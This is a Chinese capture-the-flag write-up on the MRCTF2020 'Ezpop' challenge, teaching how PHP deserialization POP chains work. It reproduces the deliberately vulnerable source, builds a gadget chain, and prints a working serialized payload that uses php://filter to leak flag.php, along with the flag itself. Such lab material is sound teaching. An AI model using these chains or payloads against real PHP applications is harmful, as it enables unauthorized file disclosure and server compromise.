---
title: 由MRCTF2020学习反序列化POP链
date: 2020-03-29
image: 
description: 
categories: 
- note
tags:
- PHP反序列化
---
复现地址：[BUUOJ](https://buuoj.cn/challenges#[MRCTF2020]Ezpop)

打开题目即送源码：[MRCTF_ezpop](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/MRCTF2020/MRCTF_ezpop.zip)

先说PHP的一些魔术方法：

```
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问（或不存在）的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

有了这些知识后，我们再来分析源码；

```
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5
%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

 

我们可以看到，在`Modifier`类里面有一个include函数，可以通过这个包含flag.php

```
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
```

当我们尝试将对象调用为函数时，`__invoke()`就会自动包含 `$var`

所以，我们又看到了`Test`类里面：

```
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

当我们访问`Test`类里面一个不可见或者不存在的属性时，`__get()`自动以函数的方式调用`$p`;

那么，源码里面那里能够访问一个属性呢？

`Show`类：

```
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```

它可以访问自身属性`str`的成员`source`

如果我们把`str`属性new一个`Test`，但是Test里面并没有source属性，

那么我们new的Test就会以函数的方式调用`$p`那么如果`$p`又是一个`Modifier`类，就会自动包含$var指向的页面。

所以，我们构造的思路是：

```
$poc = new Show; 
$poc->source = new Show; 
$poc->source->str = new Test; 
$poc->source->str->p = new Modifier;
```

playload：

```
<?php
class Modifier {
    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

$poc = new Show;
$poc->source = new Show;
$poc->source->str = new Test;
$poc->source->str->p = new Modifier;
echo serialize($poc);
```

解释一下：

```
$poc->source = new Show;
//为什么要new show两次？
//触发__toString()，source被第一层show当作字符串，于是访问source->str->source,也就是Test里面的source(不存在)，触发__get
$poc->source->str = new Test;
//$poc->source->str->source（Test->source）不存在，触发__get
```

运行脚本，得到：（注意：Modifier类的protect属性注入需要加%00）

```
O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"%00*%00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}
```

 

GET传值即获flag.php

MRCTF{1892c0f7-3c71-431f-a991-7414ca1ea339}